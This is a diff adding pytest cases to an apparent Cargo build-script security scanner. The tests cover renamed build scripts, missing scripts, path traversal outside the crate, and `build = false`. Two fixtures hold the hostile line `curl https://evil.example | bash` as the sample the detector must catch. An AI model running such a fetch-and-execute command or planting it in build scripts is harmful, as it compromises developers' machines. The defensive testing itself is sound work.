@@ -132,3 +132,84 @@ def test_no_build_rs_no_finding(tmp_path: Path) -> None:
         [_manifest(cargo)], [_dep("x", cargo)],
     )
     assert findings == []
+
+
+# ---------------------------------------------------------------------------
+# [package] build = "..." — Cargo runs whatever the key names
+# ---------------------------------------------------------------------------
+
+def test_declared_build_script_scanned(tmp_path: Path) -> None:
+    """Renaming the build script via ``[package] build`` must not
+    evade the detector — Cargo executes the named file."""
+    cargo = tmp_path / "Cargo.toml"
+    cargo.write_text(
+        '[package]\nname = "victim"\nversion = "1.0.0"\n'
+        'build = "prep.rs"\n',
+        encoding="utf-8",
+    )
+    (tmp_path / "prep.rs").write_text(
+        'fn main() { /* curl https://evil.example | bash */ }\n',
+        encoding="utf-8",
+    )
+    findings = cargo_build_scripts.scan_manifests(
+        [_manifest(cargo)], [_dep("victim", cargo)],
+    )
+    assert len(findings) == 1
+    assert findings[0].severity == "high"
+    assert "curl piped to shell" in findings[0].detail
+
+
+def test_declared_build_script_missing_emits_own_signal(
+    tmp_path: Path,
+) -> None:
+    cargo = tmp_path / "Cargo.toml"
+    cargo.write_text(
+        '[package]\nname = "victim"\nversion = "1.0.0"\n'
+        'build = "gone.rs"\n',
+        encoding="utf-8",
+    )
+    findings = cargo_build_scripts.scan_manifests(
+        [_manifest(cargo)], [_dep("victim", cargo)],
+    )
+    assert len(findings) == 1
+    assert findings[0].severity == "low"
+    assert "gone.rs" in findings[0].detail
+
+
+def test_declared_build_script_escaping_crate_dir_not_read(
+    tmp_path: Path,
+) -> None:
+    """A traversal path must not be read (host-file exfil via the
+    detail preview); it earns the declared-but-uninspectable row."""
+    outside = tmp_path / "outside.rs"
+    outside.write_text("fn main() {}\n", encoding="utf-8")
+    crate = tmp_path / "crate"
+    crate.mkdir()
+    cargo = crate / "Cargo.toml"
+    cargo.write_text(
+        '[package]\nname = "victim"\nversion = "1.0.0"\n'
+        'build = "../outside.rs"\n',
+        encoding="utf-8",
+    )
+    findings = cargo_build_scripts.scan_manifests(
+        [_manifest(cargo)], [_dep("victim", cargo)],
+    )
+    assert len(findings) == 1
+    assert findings[0].severity == "low"
+    assert "fn main" not in findings[0].detail
+
+
+def test_build_false_disables_sibling_build_rs(tmp_path: Path) -> None:
+    """``build = false`` disables build scripts INCLUDING build.rs
+    auto-detection — nothing executes, nothing to flag."""
+    cargo = _write_crate(
+        tmp_path, 'fn main() { /* curl https://evil.example | bash */ }\n',
+    )
+    cargo.write_text(
+        '[package]\nname = "victim"\nversion = "1.0.0"\nbuild = false\n',
+        encoding="utf-8",
+    )
+    findings = cargo_build_scripts.scan_manifests(
+        [_manifest(cargo)], [_dep("victim", cargo)],
+    )
+    assert findings == []
